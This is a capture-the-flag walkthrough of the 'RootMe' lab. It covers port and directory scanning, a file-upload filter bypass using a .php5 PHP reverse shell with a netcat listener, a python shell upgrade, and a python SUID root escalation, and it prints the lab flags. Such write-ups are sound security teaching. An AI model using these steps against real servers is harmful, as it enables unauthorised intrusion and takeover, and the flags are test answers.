# Task 2 - Reconnaissance

### Scan the machine, how many ports are open?
sudo nmap -sV -sC -T5 -p- 10.10.133.170 -oN ~/Github/RootMeCTF/nmapscan.md
-sV - scans for the versions of the services running on the open ports
-sC - scans using the default scripts in nmap
-T5 - the fastest possible scan for nmap
-oN - outputs the results to a file

From our nmap scan we can see there are 2 ports open 22,80
Answer: 2

### What version of Apache is running?

Since we used the -sV option in our nmap scan we can see the Apache version is 2.4.29

Answer: 2.4.29

### What service is running on port 22?

Port 22 is the port for SSH and we can verify that using our nmap scan
Answer: ssh

### Find directories on the web server using the GoBuster tool.

I have pasted the command I used for this question
gobuster dir -u http://10.10.225.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -q

### What is the hidden directory?

Looking at the results from our gobuster scan we have uploads, panel, server-status that look interesting. Uploads did not have any information, panel has a page where we can upload files to the machine so that is the answer.
Answer: /panel/

# Getting a shell

### user.txt

Since we are able to upload files I grabbed a php reverse shell from pentestmonkey.
https://github.com/pentestmonkey/php-reverse-shell

After changing the IP address to IP of my VPN connection and the port we want to listen on we can try to upload the file.

The file type is not allowed on the site. After doing some research I can find there are file type work arounds for file type blacklisting. .php5 runs as a php file in Apache so we can try that one.

Afer changing the file to php-reverse-shell.php5 it does successfully upload to the /panel page

now we want to set up a netcat listener with nc -lvnp 4444

Going back to the uploads page we can go to the page http://IP/uploads/php-reverse-shell.php5

This successfully gets us a shell, to stablilize the shell we can use python to spawn a bash shell python -c 'import pty; pty.spawn("/bin/bash")'

we can find the user.txt with the find command: find / -type f -name user.txt

/ - to start the search at the base directory
-type - the type we are searching for "f" for file
-name - the name of the file

scrolling up we are able to find the user.txt in the /var/www directory

user.txt: THM{y0u_g0t_a_sh3ll}

# Privilege escalation

### Search for files with SUID permission, which file is weird?

I did some research on how to find files with SUID permissions and came up with the following command

find / -user root -perm -4000 2>/dev/null

/ - starting in the base directory
-user - the user that we are searching for
-perm - -4000 the SUID value is set to 4
2>/dev/null - all errors are sent to the /dev/null file so we don't see them

we can see /usr/bin/python is one of the files we can use

### Find a form to escalate your privileges.

I went to search for an exploit on GTFOBins and in the python section there is an exploit for SUID

SUID:

sudo install -m =xs $(which python) .
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Since we don't have the sudo password for our user we can skip the first command

For the second command we don't have to add the ./ at the beginning. After running the second command we get another shell. Running id we can see we are root.

Now we can go to the /root directory, and we can find the root.txt

root.txt: THM{pr1v1l3g3_3sc4l4t10n}

For this machine we were able to use a SetUID exploit through python. Once we had a shell we were able to spawn an escalated shell and find the root flag.